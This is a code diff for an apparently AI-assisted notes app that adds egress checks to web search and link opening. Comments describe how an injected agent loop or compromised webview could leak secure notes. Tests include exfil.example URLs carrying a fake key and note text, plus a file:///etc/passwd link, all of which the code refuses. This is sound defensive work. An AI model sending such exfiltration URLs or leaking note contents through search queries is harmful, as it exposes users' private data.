@@ -51,9 +51,12 @@ fn web_search_blocking(query: &str, limit: Option<usize>) -> Result<Vec<WebResul
     if q.is_empty() {
         return Ok(vec![]);
     }
-    if crate::secret::protected_for_remote(q) {
+    if q.chars().count() > WEB_QUERY_MAX_CHARS {
+        return Err("blocked: that search query is far too long to be a search query.".into());
+    }
+    if crate::secret::blocked_for_remote(q) {
         return Err(
-            "blocked: that query looks like it contains a secret — not sending it to the web."
+            "blocked: that query carries private content — not sending it to the web."
                 .into(),
         );
     }
@@ -87,6 +90,11 @@ const WEB_FETCH_MAX_REDIRECTS: u32 = 3;
 /// stuff read-note prose into query params — so an over-long URL is refused
 /// outright (audit 2026-07). 2048 matches the classic interoperable limit.
 const WEB_FETCH_MAX_URL_CHARS: usize = 2048;
+/// The same reasoning for the SEARCH lane, which had no cap at all: a query is
+/// a channel with a fixed destination but no size limit, so an injected loop
+/// could ship an unbounded volume of note prose to the search engine in one
+/// call (audit 2026-08-01). A real query is words, not a document.
+const WEB_QUERY_MAX_CHARS: usize = 512;
 
 /// Private / loopback / link-local / ULA / CGNAT / unspecified — never connect.
 fn ip_is_private(ip: IpAddr) -> bool {
@@ -225,7 +233,7 @@ fn web_fetch_blocking(url: &str, max_chars: Option<usize>) -> Result<String, Str
     if !(url.starts_with("http://") || url.starts_with("https://")) {
         return Err("web_fetch needs an http(s) URL.".into());
     }
-    if crate::secret::protected_for_remote(url) {
+    if crate::secret::blocked_for_remote(url) {
         return Err("blocked: that URL looks like it contains a secret — not fetching it.".into());
     }
     let cap = max_chars.unwrap_or(8000).clamp(500, 20_000);
@@ -507,11 +515,23 @@ pub fn url_openable(url: &str) -> bool {
 }
 
 /// Open a link from a rendered note/chat in the user's browser (or mail app).
+///
+/// This is an EGRESS SEAM and was not treated as one until 2026-08-01 (audit
+/// GAP 4). `url_openable` bounds the SCHEME, which stops an arbitrary app
+/// launch — but nothing bounded the CONTENT, so `open_url` was the one network
+/// channel with no secret gate at all: a compromised webview could hand the OS
+/// `https://attacker.example/?d=<a secure note's body>` and the user's browser
+/// would fetch it. The webview can invoke this directly, so the agent loop's
+/// own `EGRESS_TOOLS` list never applied. It now asks the same question every
+/// other outbound lane asks.
 #[tauri::command]
 pub fn open_url(url: String) -> Result<(), String> {
     let url = url.trim();
     if !url_openable(url) {
         return Err("only http(s) and mailto links open from here.".into());
+    }
+    if crate::secret::blocked_for_remote(url) {
+        return Err("blocked: that link carries private content — it won't be opened.".into());
     }
     #[cfg(target_os = "macos")]
     std::process::Command::new("open")
@@ -677,6 +697,36 @@ mod tests {
         assert_eq!(buf.len() as u64, WEB_FETCH_MAX_BYTES);
         let small = std::io::Cursor::new(b"tiny".to_vec());
         assert_eq!(read_capped(small).unwrap(), b"tiny");
+    }
+
+    /// AUDIT 2026-08-01, GAP 4 — `open_url` was the one outbound lane with no
+    /// content gate at all. `url_openable` bounds the SCHEME; nothing bounded
+    /// the payload, and the webview can invoke this directly, so the agent
+    /// loop's own tool allowlist never applied.
+    #[test]
+    fn open_url_refuses_a_link_carrying_private_content() {
+        // secret-shaped, in the query string
+        assert!(open_url("https://exfil.example/?k=sk-ant-abcdefghijklmnop".into()).is_err());
+        // and ordinary prose the vault has told the gate is secure
+        crate::secret::remember_secure_text(
+            "The Wexford easement dispute settles out of court in autumn.",
+        );
+        assert!(open_url(
+            "https://exfil.example/?d=the+wexford+easement+dispute+settles+out".into()
+        )
+        .is_err());
+        // the scheme rule is unchanged and still comes first
+        assert!(open_url("file:///etc/passwd".into()).is_err());
+    }
+
+    /// The search lane had a destination but no size limit, so an injected loop
+    /// could ship a document's worth of note prose to the engine in one call.
+    #[test]
+    fn over_long_search_queries_are_refused() {
+        let long = "lorem ".repeat(200);
+        assert!(long.chars().count() > WEB_QUERY_MAX_CHARS);
+        let err = web_search_blocking(&long, Some(5)).unwrap_err();
+        assert!(err.contains("too long"), "{err}");
     }
 
     #[test]
